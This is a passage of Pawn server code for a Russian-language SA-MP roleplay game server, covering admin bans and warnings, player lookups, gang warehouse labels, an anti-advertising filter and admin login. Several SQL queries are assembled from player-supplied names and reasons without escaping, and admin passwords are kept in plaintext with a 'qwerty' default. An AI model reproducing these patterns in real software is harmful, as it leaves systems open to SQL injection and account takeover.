	if(X == 0.0) return SendClientMessage(playerid, COLOR_GREY, "Критическая ошибка! Обратитесь к администрации!");
 	new Float:VPos[3];
    GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
    UseGPS[playerid] = true;
    DisablePlayerRaceCheckpoint(playerid);
	SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0, 0, 0, 5.0);
	new string[128];
	format(string, sizeof(string), "Вы отметили на карте: {ffcc00}%s. {ffffff}Расстояние: {ffcc00}%.1f м", locname, GetDistanceBetweenPoints(VPos[0], VPos[1], VPos[2], X, Y, Z));
	SendClientMessage(playerid, COLOR_WHITE, string);
	for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
	return 1;
}

stock MeAction(playerid, action[], Float:distance = 13.0)
{
	new string[128];
	format(string, sizeof(string), "%s %s", GetName(playerid), action);
	foreach(new i: Player)
	{
		if(!IsPlayerConnected(i) || GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i, COLOR_PURPLE, string);
	}
	return 1;
}

stock DoAction(playerid, action[], Float:distance = 13.0)
{
	new string[128];
	format(string, sizeof(string), "%s | %s", action, GetName(playerid));
	foreach(new i: Player)
	{
		if(!IsPlayerConnected(i) ||  GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i, COLOR_PURPLE, string);
	}
	return 1;
}

stock TryAction(playerid, action[], Float:distance = 13.0)
{
	new string[128];
	if(random(2) == 1) format(string, sizeof(string), "%s %s - {63BD4E}удачно", GetName(playerid), action);
	else format(string, sizeof(string), "%s %s - {FF6347}неудачно", GetName(playerid), action);
	foreach(new i: Player)
	{
		if(!IsPlayerConnected(i) || GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i, COLOR_PURPLE, string);
	}
	return 1;
}

stock AutoStationBusInfo(playerid, text[]) ProxDetectorNew(playerid, 30.0, 0x99CCFFFF, text);

forward OnPlayerOffban(playerid, name[], day, reason[]);
public OnPlayerOffban(playerid, name[], day, reason[])
{
	if(cache_get_row_count(dbHandle) > 0)
    {
		new string[144];
		format(string, sizeof(string), "Администратор %s заблокировал аккаунт %s в Offline на %i дней. Причина: %s", GetName(playerid), name, day, reason);
		SendClientMessageToAll(COLOR_RED, string);

		getdate(years, months, days);
		new unbandate = gettime() + day*86400;
		new data[15];
		format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s', '%s', '%s', '%d', '%d', '%s')", name, GetName(playerid), cache_get_row_int(0, 3, dbHandle), data, day, unbandate, reason);
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET warn = 0,member = 0,leader = 0,templeader = 0,rank = 0,job = 0,spawnchange = 0 WHERE name = '%s'", name);
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

        STRING_GLOBAL[0] = EOS;
		mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE "T_ADMIN" SET `bans` = bans+1 WHERE `name` = '%s'", GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");

	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}

	return 1;
}

forward OnPlayerOffwarn(playerid, name[], reason[]);
public OnPlayerOffwarn(playerid, name[], reason[])
{
	if(cache_get_row_count(dbHandle) > 0)
	{
	    new string[250];
		if(cache_get_row_int(0, 20, dbHandle) < 3)
		{
			format(string, sizeof(string), "Игрок %s получил оффлайн предупреждение от администратора %s. Причина: %s", name, GetName(playerid), reason);
			SendClientMessageToAll(COLOR_RED, string);
			format(string, sizeof(string), "UPDATE "T_ACCOUNTS" SET warn=warn+1,member=0,leader=0,templeader=0,rank=0,job=0,spawnchange=0 WHERE name='%s'", name);
			mysql_tquery(dbHandle, string, "", "");
		}
		else
		{
		    new data[15], unbandate;
			format(string, sizeof(string), "Игрок %s получил оффлайн бан на 7 дней от администратора %s. Причина: %s", name, GetName(playerid), reason);
			SendClientMessageToAll(COLOR_RED, string);
			getdate(years, months, days);
			unbandate = gettime() + 7*86400;
			format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);
			format(string, sizeof(string), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s', '%s', '%s', 7, %d, '%s')", name, GetName(playerid), cache_get_row_int(0, 3, dbHandle), data, unbandate, reason);
			mysql_tquery(dbHandle, string, "", "");
			format(string, sizeof(string), "UPDATE "T_ACCOUNTS" SET warn=0,member=0,leader=0,templeader=0,rank=0,job=0,spawnchange=0 WHERE name='%s'", name);
			mysql_tquery(dbHandle, string, "", "");
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");

	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	return 1;
}

forward OnPlayerUnban(playerid, name[]);
public OnPlayerUnban(playerid, name[])
{
    new rows, fields;
	cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок не забанен!");
    else
    {
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "DELETE FROM bans WHERE name = '%s'", name);
	    mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[A] %s[%d] разбанил игрока %s", GetName(playerid), playerid, name);
		SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
	}
	return 1;
}

forward OnPlayerOffgeta(playerid, name[]);
public OnPlayerOffgeta(playerid, name[])
{
	if(cache_get_row_count(dbHandle) > 0)
	{
	    new string[90], cash, bank, level, regip[16], lastip[16], datareg[15], datavhod[30], donate;
	    cash = cache_get_row_int(0, 11, dbHandle);
	    bank = cache_get_row_int(0, 12, dbHandle);
	    level = cache_get_row_int(0, 10, dbHandle);
	    cache_get_row(0, 14, regip, dbHandle, 16);
	    cache_get_row(0, 3, lastip, dbHandle, 16);
	    cache_get_row(0, 15, datareg, dbHandle, 15);
	    cache_get_field_content(0, "datavhod", datavhod, dbHandle, 30);
	    donate = cache_get_row_int(0, 58, dbHandle);

	    STRING_GLOBAL[0] = EOS;
		format(string, sizeof(string), "Наличные:\t\t%i\n", cash);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Банковский счёт:\t%i\n", bank);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Уровень:\t\t%i\n", level);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "IP адрес (регис.):\t%s\n", regip);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "IP адрес (последн.):\t%s\n", lastip);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Дата регистрации:\t%s\n", datareg);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Посл. вход:\t\t%s\n", datavhod);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Донат:\t\t\t%i\n", donate);
		strcat(STRING_GLOBAL, string);
		ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, name, STRING_GLOBAL, "Закрыть", "");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");
	return 1;
}

forward OnPlayerOffget(playerid, name[]);
public OnPlayerOffget(playerid, name[])
{
	if(cache_get_row_count(dbHandle) > 0)
	{
	    new string[90], idacca, cash, bank, level, regip[16], lastip[16], datareg[15], datavhod[30], donate;
	    idacca = cache_get_row_int(0, 0, dbHandle);
	    cash = cache_get_row_int(0, 11, dbHandle);
	    bank = cache_get_row_int(0, 12, dbHandle);
	    level = cache_get_row_int(0, 10, dbHandle);
	    cache_get_row(0, 14, regip, dbHandle, 16);
	    cache_get_row(0, 3, lastip, dbHandle, 16);
	    cache_get_row(0, 15, datareg, dbHandle, 15);
	    cache_get_field_content(0, "datavhod", datavhod, dbHandle, 30);
	    donate = cache_get_row_int(0, 58, dbHandle);

	    STRING_GLOBAL[0] = EOS;
		format(string, sizeof(string), "Номер аккаунта:\t%i\n", idacca);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Наличные:\t\t%i\n", cash);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Банковский счёт:\t%i\n", bank);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Уровень:\t\t%i\n", level);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "IP адрес (регис.):\t%s\n", regip);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "IP адрес (последн.):\t%s\n", lastip);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Дата регистрации:\t%s\n", datareg);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Посл. вход:\t\t%s\n", datavhod);
		strcat(STRING_GLOBAL, string);
		format(string, sizeof(string), "Донат:\t\t\t%i\n", donate);
		strcat(STRING_GLOBAL, string);
		ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, name, STRING_GLOBAL, "Закрыть", "");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");
	return 1;
}

stock PlayerMenuExit(playerid)
{
    if(PlayersMenu[playerid] == 2)
	{
		if(!GetPVarInt(playerid, "UsedCTO")) return 0;
		new bizzid = GetPVarInt(playerid,"CTObizzid");
		if(GetPlayerState(playerid) != 2) return SKick(playerid, 12221);
		new pveh = GetPlayerVehicleID(playerid);
		SetVehiclePos(pveh,BizzInfo[bizzid][bEntrx],BizzInfo[bizzid][bEntry],BizzInfo[bizzid][bEntrz]);
		DeletePVar(playerid,"UsedCTO");
		SetPVarInt(playerid, "AntiBreik", 3);
		SetVehicleZAngle(pveh,270.9845);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetVehicleVirtualWorld(pveh,0);
		LinkVehicleToInterior(pveh,0);
		PutPlayerInVehicle(playerid, pveh, 0);
		TogglePlayerControllable(playerid,true);
		SetCameraBehindPlayer(playerid);
	}
    PlayersMenu[playerid] = 0;
	for(new i = 0; i < 7; i++) PlayerTextDrawHide(playerid, PlayerMenu[playerid][i]);
	for(new i = 0; i < 11; i++) TextDrawHideForPlayer(playerid, KolvDialog[i]);
	for(new i = 0; i < 11; i++) PlayerTextDrawHide(playerid, NameDialog[playerid][i]);
	for(new i = 0; i < 5; i++) PlayerTextDrawHide(playerid, TextDialog[playerid][i]);
	CancelSelectTextDraw(playerid);
	TextDrawSetSelectable(KolvDialog[10], true);
	return 1;
}

stock SendSMS(playerid)
{
	new string[85];
	format(string, sizeof(string), "{ffffff}Вы пытаетесь отправить СМС на номер: %i\n\nВведите текст сообщения:", GetPVarInt(playerid, "PhoneSMS"));
	ShowPlayerDialog(playerid, D_PHONE+4, 1, "СМС", string, "Принять", "Назад");
	return 1;
}

stock SetString(param_1[], param_2[], size = 300)
{
    return strmid(param_1, param_2, 0, strlen(param_2), size);
}

stock GetString(param1[],param2[])
{
	return !strcmp(param1, param2, false);
}

forward GmTest(playerid, targetid, Float:oldhealth);
public GmTest(playerid, targetid, Float:oldhealth)
{
    new Float: newhealth;
	GetPlayerHealth(targetid, newhealth);
	new mes[256], string[60];
	if(oldhealth == newhealth) string = "{FF0000}Возможно игрок использует God Mode(GM)";
	if(oldhealth != newhealth) string = "{05E900}Вероятно игрок чист, показатель его HP уменьшился";
    format(mes, sizeof(mes), "{FFFFFF}Было: %.0f.0 (HP)\n{FFFFFF}Стало: %.0f.0 (HP)\n{FFFFFF}Уменьшилось на: %.0f.0 (HP)\n\n%s", oldhealth, newhealth, oldhealth-newhealth, string);
    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, GetName(targetid), mes, "Закрыть", "");
	SetHealth(targetid, oldhealth);
	StartGMTest[playerid] = false;
	return 1;
}

forward StealMats(playerid);
public StealMats(playerid)
{
    new newslot, string[128];
	new ammo = random(5) + 1;

	if(gArmyWarehouse[1] < ammo)return SendClientMessage(playerid,COLOR_GREY,"На складе армии нет патронов!");
	if(CheckMaxVes(playerid,27,ammo,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
	gArmyWarehouse[1] -= ammo;
 	GiveItem(playerid, 27, ammo);
	format(string, sizeof(string), "~b~ПАТРОНОВ: +%d", ammo);
	GameTextForPlayer(playerid, string, 1500, 6);
	SaveItem(playerid,newslot);
	UpdateArmyAmmo();
	return 1;
}

stock UpdateArmyAmmo()
{
	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{FFFFFF}Патронов: {63BD4E}%d", gArmyWarehouse[1]);
	UpdateDynamic3DTextLabelText(gArmyWarehouseText,0xFFFFFFFF,STRING_GLOBAL);
	return 1;
}
stock UpdTerrsBand()
{
	new GangTotalGz[5];

  	new string[550];

	format(string,sizeof(string), "{009900}Склад - ОПГ \"Тамбовская\"\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых улиц: {63BD4E}%i\n\n{FFFFFF}Склад: %s\n\nВзаимодействие: {CCB428}Л.ALT", GangPatr[0], DrugsBank[TEAM_GROOVE], FracBank[0], GangTotalGz[3], b_Sklad{0}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Gang3d[0],0xFFFFFFFF,string);

	format(string,sizeof(string),"{CC00FF}Склад - ОПГ \"Подольская\"\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых улиц: {63BD4E}%i\n\n{FFFFFF}Склад: %s\n\nВзаимодействие: {CCB428}Л.ALT", GangPatr[1], DrugsBank[TEAM_BALLAS], FracBank[1], GangTotalGz[2], b_Sklad{1}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Gang3d[1],0xFFFFFFFF,string);

	/*format(string,sizeof(string),"{6666FF}Склад - Рифа\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых улиц: {63BD4E}%i\n\n{FFFFFF}Склад: %s", GangPatr[2], DrugsBank[TEAM_RIFA], FracBank[2], GangTotalGz[0], b_Sklad{2}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Gang3d[2],0xFFFFFFFF,string);

	format(string,sizeof(string),"{00B4E1}Склад - Ацтек\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых улиц: {63BD4E}%i\n\n{FFFFFF}Склад: %s", GangPatr[3], DrugsBank[TEAM_OPGTEST2], FracBank[3], GangTotalGz[1], b_Sklad{3}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Gang3d[3],0xFFFFFFFF,string);

	format(string,sizeof(string),"{FFCC00}Склад - Вагос\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых улиц: {63BD4E}%i\n\n{FFFFFF}Склад: %s", GangPatr[4], DrugsBank[TEAM_VAGOS], FracBank[4], GangTotalGz[4], b_Sklad{4}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Gang3d[4],0xFFFFFFFF,string);*/
}

stock WHDataUpdate()
{
	new string[500];
	format(string,sizeof(string),"{993366}Итальянская Мафия\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых бизнесов: {63BD4E}%i\n\n{FFFFFF}Склад: %s\n\nВзаимодействие: {CCB428}Л.ALT", MafiaPatr[0], DrugsBank[TEAM_OPG1], FracBank[6], MafiaTotalBizz[0], b_Sklad{5}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Mafia3d[0],0xFFFFFFFF,string);

	format(string,sizeof(string),"{BB0000}Русская Мафия\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых бизнесов: {63BD4E}%i\n\n{FFFFFF}Склад: %s\n\nВзаимодействие: {CCB428}Л.ALT", MafiaPatr[1], DrugsBank[TEAM_RSM], FracBank[5], MafiaTotalBizz[1], b_Sklad{6}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
	UpdateDynamic3DTextLabelText(Mafia3d[1],0xFFFFFFFF,string);

	format(string,sizeof(string),"{BB0000}Сейф СМИ\n\n{FFFFFF}Деньги: {63BD4E}%d", FracBank[8]);
	UpdateDynamic3DTextLabelText(nBank3d[0],0xFFFFFFFF,string);

	format(string,sizeof(string),"{BB0000}Государственный Сейф\n\n{FFFFFF}Деньги: {63BD4E}%d", FracBank[9]);
	UpdateDynamic3DTextLabelText(nBank3d[1],0xFFFFFFFF,string);

	UpdTerrsBand();
}

stock BadFloat(Float:x)
{
    if(x >= 10.0 || x <= -10.0) return 1;
    return 0;
}

stock IsIpFound(string[])
{
	new Regex:r = Regex_New("|([0-9]{2,3}\\.){3}[0-9]{0,3}:[0-9]{4}|");
	new check = Regex_Check(string, r);
	Regex_Delete(r);
	return check;
}

stock CheckString(string[])
{
    static const WebSites[][] = {
		".ws",".ru",".tk",".rp","www.",".org",".net",".cc",".рф",".by",".biz",".su",".info",
		".ru",".ru","Переезд","Новый сервер","NEW IP",".ru",".ru","vk . com",
		".ws",".ws","дам админку","vk f.com","cheat-master",".ws","Чит Мастер",
		"Bathory","youtube.com","мамк","mq","МАМК","mamke привет",
		"MQ","CM_","CHEAT-MASTER","cheat master","CHEAT MASTER","positiv","POSITIV","Positiv",
		"нубо мод","дно сервер","нубо сервер","нубомод","дносервер","нубосервер","сервер гавно","217.106",
		"106.106"
	};
	for(new i = 0; i < sizeof(WebSites); i++)
	{
		if(strfind(string, WebSites[i], true) != -1) return 1;
	}
	return 0;
}
stock CheckReport(string[])
{
    static const RepBot[][] = {"дайте мне","можно мне","выдайте мне","админку","админ права"};
	for(new i = 0; i < sizeof(RepBot); i++) if(strfind(string, RepBot[i], true) != -1) return 1;
	return 0;
}


stock CheckExceptionName(string[])
{
    if(strfind(string, "Steven_Jordan", true) != -1
	|| strfind(string, "Jemmi_Cookkie", true) != -1
	|| strfind(string, "Sky_Dushevniy", true) != -1
	|| strfind(string, "Lev_Belyaev", true) != -1
	|| strfind(string, "Mihail_Lavrov", true) != -1
	|| strfind(string, "Edgar_Rayskiy", true) != -1
	|| strfind(string, "Thomas_Malibu", true) != -1
	|| strfind(string, "Roman_Boyarsky", true) != -1
	|| strfind(string, "maxeitzen", true) != -1)
	return 1;

	return 0;
}

stock PlayerGetsChatBan(playerid, text[])
{
	new string[90];
	format(string, sizeof(string), "[A] [Антиреклама] %s[%i] подозревается в рекламе. Текст: %s", GetName(playerid), playerid, text);
	SendAdminMessage(COLOR_ORANGE, string);
	return 1;
}

stock AdminAntisliv(playerid, text[])
{
	RemoveAdmin(playerid, GetName(playerid));
	new string[88];
	format(string, sizeof(string), "[Внимание] %s[%i] подозревается во взломе", GetName(playerid), playerid);
	SendAdminMessage(COLOR_REDD, string);
	format(string, sizeof(string), "[Внимание] Текст: %s", text);
	SendAdminMessage(COLOR_REDD, string);
	new data[15], unbandate;
	getdate(years, months, days);
	unbandate = gettime() + 30*86400;
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', 'System', '%s', '%s', '30', '%d', 'Слив админки')", GetName(playerid), PI[playerid][pIP], data, unbandate);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	KickEx(playerid, "Antisliv");
	return 1;
}

stock BotReport(playerid)
{
	SendClientMessage(playerid, COLOR_GREY, "-{ffffff} Админ права можно приобрести в /donate, а кредиты можно пополнить на сайте "SERVER_WEBSITE"");
	SendClientMessage(playerid, COLOR_GREY, "-{ffffff} Администрация не чего не выдает, всего добивайтесь рп путем!");
	return 1;
}

stock AttemptRemoveChiefAdmin(playerid)
{
	RemoveAdmin(playerid, GetName(playerid));
    new data[15], unbandate;
	getdate(years, months, days);
	unbandate = gettime() + 30*86400;
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', 'System', '%s', '%s', '30', '%d', 'Слив админки')", GetName(playerid), PI[playerid][pIP], data, unbandate);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[Внимание] %s был снят за попытку выдать наказание главному администратору", GetName(playerid));
    SendAdminMessageEx(COLOR_REDD, STRING_GLOBAL, 5);
    Kick(playerid);
	return 1;
}

stock AttemptRemoveAdmin(playerid)
{
    SendClientMessage(playerid, COLOR_GREY, "Администратор выше Вас рангом, или равен вам");

    STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[Внимание] %s попытался выдать наказание администратору выше его по рангу", GetName(playerid));
    SendAdminMessageEx(COLOR_REDD, STRING_GLOBAL, 5);
	return 1;
}

stock RemoveAdmin(targetid, name[])
{
	PI[targetid][pAdmin] = 0;
	AdminLogged[targetid] = false;
	new string[128];
	mysql_format(dbHandle, string, sizeof(string), "DELETE FROM "T_ADMIN" WHERE `name`='%s'", name);
	mysql_tquery(dbHandle, string, "", "");
	MysqlUpdatePlayerInt(targetid, "admin", PI[targetid][pAdmin]);
	Iter_Remove(Admins, targetid);
	return 1;
}

stock SetSpawnInfoEx(playerid, skin, Float:x, Float:y, Float:z, Float:a)
    return SetSpawnInfo(playerid, 255, skin, x, y, z-0.2, a, 0, 0, 0, 0, 0, 0);

stock HaveWeapon(playerid, weaponid)
{
	new weapons[13][2];
	for(new i = 0; i <= 12; i++)
	{
		GetPlayerWeaponData(playerid, i, weapons[i][0], weapons[i][1]);
		if((weapons[i][0] == weaponid) && weapons[i][1]) return 1;
	}
	return 0;
}

stock split(const strsrc[], strdest[][], delimiter)
{
	new i, li, aNum, len;
	while(i <= strlen(strsrc))
	{
		if(strsrc[i]==delimiter || i==strlen(strsrc))
		{
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}

stock GetNameWithNumber(number)
{
	new str[MAX_PLAYER_NAME] = {"Offline/None"};
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(PI[i][pPhoneNumber] == number)
		{
			format(str, sizeof(str), "%s", GetName(i));
			break;
		}
	}
	return str;
}

forward SetAdmin(playerid, name[], level);
public SetAdmin(playerid, name[], level)
{
	new rows, fields, string[256];
	cache_get_data(rows, fields);
	if(rows)
	{
		if(!level)
		{
		    if(GetPlayerID(name) != INVALID_PLAYER_ID) PI[GetPlayerID(name)][pAdmin] = 0, Iter_Remove(Admins, GetPlayerID(name));
			mysql_format(dbHandle, string, sizeof(string), "DELETE FROM "T_ADMIN" WHERE `name`='%s'", name);
			mysql_tquery(dbHandle, string, "", "");
			mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ACCOUNTS" SET `admin` = '0' WHERE `name` = '%s'", name);
			mysql_tquery(dbHandle, string, "", "");
			format(string, sizeof(string), "Вы сняли %s с должности администратора", name);
	    	SendClientMessage(playerid, COLOR_YELLOW, string);
		}
		else
		{
		    if(GetPlayerID(name) != INVALID_PLAYER_ID)
			{
				new to_player = GetPlayerID(name);
				PI[to_player][pAdmin] = level;
				PI[to_player][pAWarn] = 0;
				MysqlUpdatePlayerInt(to_player, "awarn", PI[to_player][pAWarn]);
			}
			mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ADMIN" SET `level` = '%d' WHERE `name` = '%s' LIMIT 1", level, name);
			mysql_tquery(dbHandle, string, "", "");
			format(string, sizeof(string), "Вы установили уровень администратора %s на %i", name, level);
	    	SendClientMessage(playerid, COLOR_YELLOW, string);
		}
	}
	else
	{
		if(!level) return SendClientMessage(playerid, COLOR_GREY, "Игрок не администратор");
		new data[15];
		getdate(years, months, days);
		format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);
		mysql_format(dbHandle, string, sizeof(string), "INSERT INTO "T_ADMIN" (`name`, `level`, `last_connect`, `put_admin`, `data`) VALUES ('%s', %d, '%s', '%s', '%s')", name, level, data, GetName(playerid), data);
		mysql_tquery(dbHandle, string, "", "");
		format(string, sizeof(string), "%s добавлен в список администрации. Уровень полномочий %i", name, level);
	    SendClientMessage(playerid, COLOR_GREEN, string);
	    if(GetPlayerID(name) != INVALID_PLAYER_ID)
    	{
    	    format(string, sizeof(string), "%s назначил Вас администратором", GetName(playerid));
	    	SendClientMessage(GetPlayerID(name), COLOR_YELLOW, string);
    	}
	}
	return 1;
}
forward Alogin(playerid, name[]);
public Alogin(playerid, name[])
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(!rows)
	{
		if(PI[playerid][pAdmin] > ADM_NONE) PI[playerid][pAdmin] = 0;
		return 1;
	}
	new Password[16];
	cache_get_field_content(0, "password", Password, dbHandle);
	if(!strcmp(Password, "qwerty", true))
	{
		SetPVarInt(playerid, "aLogin", 1);
		ShowPlayerDialog(playerid, D_ALOGIN, DIALOG_STYLE_INPUT, "Регистрация администратора", "\
		{FFFFFF}Введите пароль, который будет от панели администратора\n\n\
		{63BD4E}Примечание:\n\
		\t- Пароль должен состоять из латинских букв и цифр\n\
		\t- Размер пароля от 6 до 15 символов", "Принять", "Отмена");
	}
	else
	{
		SetPVarInt(playerid, "aLogin", 0);
		ShowPlayerDialog(playerid, D_ALOGIN, DIALOG_STYLE_INPUT, "Доступ администратора", "\
		{FFFFFF}Введите Ваш пароль от панели администратора", "Принять", "Отмена");
	}
	return 1;
}

forward AloginReg(playerid, name[]);
public AloginReg(playerid, name[])
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(!rows) return 1;
	new inputtext[16], string[144];
	GetPVarString(playerid, "inputtext", inputtext, sizeof(inputtext));
	mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ADMIN" SET `password` = '%s' WHERE `name` = '%s' LIMIT 1", inputtext, GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	PI[playerid][pAdmin] = cache_get_row_int(0, 1, dbHandle);
	MysqlUpdatePlayerInt(playerid, "admin", PI[playerid][pAdmin]);

	if(!IsPlayerGrandAdmin(playerid))
	{
	    SendClientMessage(playerid, COLOR_GREY, "Вы успешно авторизовались как Администратор");
		if(PI[playerid][pSex] == 1) format(string, sizeof(string), "[A] %s %s[%i] авторизовался", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid);
		else format(string, sizeof(string), "[A] %s %s[%i] авторизовалась", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid);
		SendAdminMessage(COLOR_BLUE, string);
	}

